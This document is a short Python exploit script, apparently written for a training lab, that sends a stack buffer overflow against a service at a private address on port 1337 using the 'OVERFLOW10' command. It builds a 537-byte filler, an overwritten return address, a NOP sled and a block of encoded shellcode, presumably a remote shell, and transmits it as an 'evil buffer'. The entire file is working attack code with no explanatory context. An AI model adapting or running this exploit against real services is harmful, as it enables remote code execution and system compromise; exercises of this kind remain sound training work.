#!/usr/bin/env python3
import socket, subprocess, time, sys

ip = "10.10.62.124"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\x03\x12\x50\x62"

padding = "\x90" * 8
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x2f\x06\xec\x04\x83\xee\xfc\xe2\xf4\xd3\xee\x6e\x04"
"\x2f\x06\x8c\x8d\xca\x37\x2c\x60\xa4\x56\xdc\x8f\x7d\x0a"
"\x67\x56\x3b\x8d\x9e\x2c\x20\xb1\xa6\x22\x1e\xf9\x40\x38"
"\x4e\x7a\xee\x28\x0f\xc7\x23\x09\x2e\xc1\x0e\xf6\x7d\x51"
"\x67\x56\x3f\x8d\xa6\x38\xa4\x4a\xfd\x7c\xcc\x4e\xed\xd5"
"\x7e\x8d\xb5\x24\x2e\xd5\x67\x4d\x37\xe5\xd6\x4d\xa4\x32"
"\x67\x05\xf9\x37\x13\xa8\xee\xc9\xe1\x05\xe8\x3e\x0c\x71"
"\xd9\x05\x91\xfc\x14\x7b\xc8\x71\xcb\x5e\x67\x5c\x0b\x07"
"\x3f\x62\xa4\x0a\xa7\x8f\x77\x1a\xed\xd7\xa4\x02\x67\x05"
"\xff\x8f\xa8\x20\x0b\x5d\xb7\x65\x76\x5c\xbd\xfb\xcf\x59"
"\xb3\x5e\xa4\x14\x07\x89\x72\x6e\xdf\x36\x2f\x06\x84\x73"
"\x5c\x34\xb3\x50\x47\x4a\x9b\x22\x28\xf9\x39\xbc\xbf\x07"
"\xec\x04\x06\xc2\xb8\x54\x47\x2f\x6c\x6f\x2f\xf9\x39\x54"
"\x7f\x56\xbc\x44\x7f\x46\xbc\x6c\xc5\x09\x33\xe4\xd0\xd3"
"\x7b\x6e\x2a\x6e\xe6\x0c\xbf\xc8\x84\x06\x2f\x17\xb0\x8d"
"\xc9\x6c\xfc\x52\x78\x6e\x75\xa1\x5b\x67\x13\xd1\xaa\xc6"
"\x98\x08\xd0\x48\xe4\x71\xc3\x6e\x1c\xb1\x8d\x50\x13\xd1"
"\x47\x65\x81\x60\x2f\x8f\x0f\x53\x78\x51\xdd\xf2\x45\x14"
"\xb5\x52\xcd\xfb\x8a\xc3\x6b\x22\xd0\x05\x2e\x8b\xa8\x20"
"\x3f\xc0\xec\x40\x7b\x56\xba\x52\x79\x40\xba\x4a\x79\x50"
"\xbf\x52\x47\x7f\x20\x3b\xa9\xf9\x39\x8d\xcf\x48\xba\x42"
"\xd0\x36\x84\x0c\xa8\x1b\x8c\xfb\xfa\xbd\x0c\x19\x05\x0c"
"\x84\xa2\xba\xbb\x71\xfb\xfa\x3a\xea\x78\x25\x86\x17\xe4"
"\x5a\x03\x57\x43\x3c\x74\x83\x6e\x2f\x55\x13\xd1")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
print(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")